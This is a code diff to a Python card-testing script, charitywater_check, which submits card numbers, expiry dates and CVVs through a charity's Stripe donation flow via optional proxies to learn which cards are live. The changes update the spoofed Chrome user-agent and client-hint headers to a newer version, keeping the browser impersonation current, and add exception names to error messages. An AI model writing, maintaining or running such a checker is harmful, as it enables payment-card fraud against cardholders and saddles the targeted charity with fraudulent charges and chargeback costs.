@@ -66,7 +66,7 @@ async def charitywater_check(cc, mm, yy, cvv, proxy=None):
                 f"{SITE_URL}/donate",
                 headers={
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                     "accept-language": "en-US,en;q=0.9",
                 },
             )
@@ -109,14 +109,14 @@ async def charitywater_check(cc, mm, yy, cvv, proxy=None):
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": "https://js.stripe.com",
                     "referer": "https://js.stripe.com/",
-                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                 },
                 data=stripe_data,
             )
             pm_result = resp.json()
         except Exception as e:
             elapsed = round(time.time() - start, 2)
-            return f"Error - PM creation failed: {str(e)[:50]} [{elapsed}s]"
+            return f"Error - PM creation failed: {type(e).__name__}: {str(e)[:50]} [{elapsed}s]"
 
         if "error" in pm_result:
             err = pm_result["error"]
@@ -187,11 +187,11 @@ async def charitywater_check(cc, mm, yy, cvv, proxy=None):
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "origin": SITE_URL,
                     "referer": f"{SITE_URL}/donate",
-                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                     "x-requested-with": "XMLHttpRequest",
                     "x-csrf-token": csrf_token,
                     "accept-language": "en-US,en;q=0.9",
-                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                     "sec-ch-ua-mobile": "?0",
                     "sec-ch-ua-platform": '"Windows"',
                     "sec-fetch-dest": "empty",
@@ -202,7 +202,7 @@ async def charitywater_check(cc, mm, yy, cvv, proxy=None):
             )
         except Exception as e:
             elapsed = round(time.time() - start, 2)
-            return f"Error - Donation request failed: {str(e)[:50]} [{elapsed}s]"
+            return f"Error - Donation request failed: {type(e).__name__}: {str(e)[:50]} [{elapsed}s]"
 
         elapsed = round(time.time() - start, 2)
         status_code = resp2.status_code
@@ -227,7 +227,7 @@ async def charitywater_check(cc, mm, yy, cvv, proxy=None):
                     f"https://api.stripe.com/v1/payment_intents/{pi_id}?key={PK_KEY}&client_secret={pi_secret}",
                     headers={
                         "accept": "application/json",
-                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                     },
                 )
                 pi_data = pi_resp.json()
